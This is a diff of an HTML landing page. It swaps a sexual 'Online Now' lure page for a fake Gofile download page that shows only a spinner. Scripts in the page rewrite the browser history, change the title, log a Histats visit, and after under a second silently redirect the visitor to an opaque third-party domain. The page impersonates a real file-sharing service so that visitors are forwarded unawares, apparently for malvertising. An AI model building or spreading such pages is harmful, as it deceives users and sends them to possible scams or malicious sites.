@@ -1,180 +1,98 @@
-<!DOCTYPE html>
-
+ <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Online Now... 💋💦</title>
-<meta property="og:title" content="Online Now... 💋💦">
-<meta property="og:description" content="Click to continue">
-<meta property="og:image" content="https://algo.anuae.workers.dev/images/2026/8/6/19832128.jpg">
-<meta property="og:type" content="website">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Online Now... 💋💦">
-<meta name="twitter:description" content="Click to continue">
-<meta name="twitter:image" content="https://algo.anuae.workers.dev/images/2026/8/6/19832128.jpg">
+  <meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@YourTwitterHandle">
+<meta name="twitter:title" content="Gofile">
+<meta name="twitter:description" content="file shared with Gofile">
+<meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhG5bME9td5ydf4z5zOtQH-MXx16RefC8vyX9uC_nlRlncbEu4pvmlgq5ZxRU13aTqTzrL7m7YVWD9THKOsEk7fE1jnlU-Zm1yBHZxpx3StctTwE_UAOUhmJwZdVDLplyqUt3CQbPCykyN5tjnfGNiSeKNyqRrV79T7LdtHstAFJReM2306ihcEiA9leXU3/s1600/images%20%283%29.png">
+<meta name="twitter:image:alt" content="Gofile">
 
-<style>
+<meta name="twitter:url" content="https://example.com">
+ 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gofile next</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Animasi rotasi yang sangat lancar (linear) */
+        @keyframes spin-smooth {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
 
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial,Helvetica,sans-serif;
-}
+        .spinner-container {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-html,body{
-    width:100%;
-    height:100%;
-    overflow:hidden;
-    background:#000;
-}
+        .spinner-ring {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            /* Membuat lengkungan biru tipis dengan gradasi */
+            border: 3px solid transparent;
+            border-top: 3px solid #3b82f6; 
+            border-right: 1px solid rgba(59, 130, 246, 0.2);
+            /* Animasi berjalan terus-menerus tanpa jeda */
+            animation: spin-smooth 0.8s linear infinite;
+            /* Memberikan efek cahaya (glow) seperti di gambar */
+            box-shadow: 0 0 10px rgba(59, 130, 246, 0.1);
+        }
 
-/* Background blur */
-.bg{
-    position:fixed;
-    inset:0;
-    overflow:hidden;
-}
-
-.bg video{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-    filter:blur(25px) brightness(.45);
-    transform:scale(1.2);
-}
-
-/* Video utama */
-.main-video{
-    position:fixed;
-    inset:0;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-}
-
-.main-video video{
-    height:100vh;
-    max-width:100%;
-    object-fit:contain;
-    border-radius:20px;
-    box-shadow:0 0 50px rgba(0,0,0,.5);
-}
-
-/* Overlay */
-.overlay{
-    position:fixed;
-    inset:0;
-    background:linear-gradient(to top,rgba(0,0,0,.7),rgba(0,0,0,.15));
-}
-
-/* Konten */
-.content{
-    position:absolute;
-    left:50%;
-    bottom:50px;
-    transform:translateX(-50%);
-    width:90%;
-    max-width:450px;
-    text-align:center;
-    color:white;
-}
-
-h1{
-    font-size:34px;
-    margin-bottom:10px;
-}
-
-p{
-    opacity:.9;
-    margin-bottom:25px;
-    line-height:1.5;
-}
-
-.btn{
-    display:block;
-    text-decoration:none;
-    background:#25D366;
-    color:#fff;
-    padding:18px;
-    border-radius:50px;
-    font-size:22px;
-    font-weight:bold;
-    transition:.3s;
-}
-
-.btn:hover{
-    transform:scale(1.04);
-}
-
-@media(max-width:768px){
-
-.main-video video{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-    border-radius:0;
-}
-
-.content{
-    bottom:35px;
-}
-
-h1{
-    font-size:28px;
-}
-
-}
-
-</style>
-
+        body {
+            background-color: #1a202c; /* Warna navy gelap sesuai gambar */
+        }
+    </style>
 </head>
+<body class="flex flex-col min-h-screen text-slate-400 font-sans selection:bg-blue-500/30">
 
-<body>
+    <!-- Header / Navbar -->
+    <header class="p-4 border-b border-white/5 flex items-center justify-between">
+        <button class="bg-[#3b82f6] p-2 rounded-md hover:bg-blue-500 transition-all active:scale-95 shadow-lg">
+            <!-- Icon Menu (Hamburger) -->
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 6h16M4 12h16M4 18h16" />
+            </svg>
+        </button>
+    </header>
 
-<div class="bg">
-<video autoplay muted loop playsinline>
-<source src="https://cdn.aceimg.com/uF4i0YfL6.mp4" type="video/mp4">
-</video>
-</div>
+    <!-- Main Content Area (Spinner Tengah) -->
+    <main class="flex-grow flex items-center justify-center">
+        <div class="spinner-container">
+            <div class="spinner-ring"></div>
+        </div>
+    </main>
 
-<div class="main-video">
-<video autoplay muted loop playsinline>
-<source src="https://cdn.aceimg.com/uF4i0YfL6.mp4" type="video/mp4">
-</video>
-</div>
+    <!-- Footer Area -->
+    <footer class="py-12 px-6 text-center border-t border-white/5 space-y-8">
+        <!-- Tautan Navigasi -->
+        <nav class="flex flex-col space-y-4 text-[15px] tracking-wide">
+            <a href="#" class="hover:text-blue-400 transition-colors">Home</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Terms of Service</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Privacy Policy</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Copyright</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Contact</a>
+        </nav>
+        
+        <!-- Baris Hak Cipta -->
+        <div class="text-[13px] text-slate-500 pt-4">
+            WOJTEK SAS © 2026, made with 
+            <span class="inline-block animate-pulse text-red-500 mx-1">❤️</span> 
+            by Gofile Team
+        </div>
+    </footer>
 
-<div class="overlay"></div>
-
-<div class="content">
-
-<h1>A LITTLE PIECE OF MY WORLD</h1>
-
-<p>
-I'm sharing my unfiltered thoughts and quiet moments here. Looking for someone genuine to talk to—no games, just real conversation..
-</p>
-
-<a class="btn" href="https://omg10.com/4/11344085">
-Continue
-</a>
-
-</div>
-
-
-  <script>
-    // spinner tampil 2 detik lalu hilang
-    setTimeout(() => {
-      const spinner = document.getElementById('spinner');
-      spinner.style.opacity = '0';
-      spinner.style.transition = 'opacity 0.3s ease';
-    }, 2000);
-  </script>
 
 <!-- ===== HISTATS (PAKSA ROOT) ===== -->
 <script>
 /* paksa Histats selalu baca ROOT */
 history.replaceState(null, "", "/");
-document.title = "gigafile";
+document.title = "euphoria";
 
 /* cegah double hit */
 if (!sessionStorage.getItem("histats_hit")) {
@@ -206,10 +124,14 @@ setTimeout(() => {
   history.replaceState(null, "", "/" + slug);
 }, 200);
 
-
+/* redirect */
+setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
+  }, 600);
+}, 800);
 </script>
 
-
-  
 </body>
 </html>
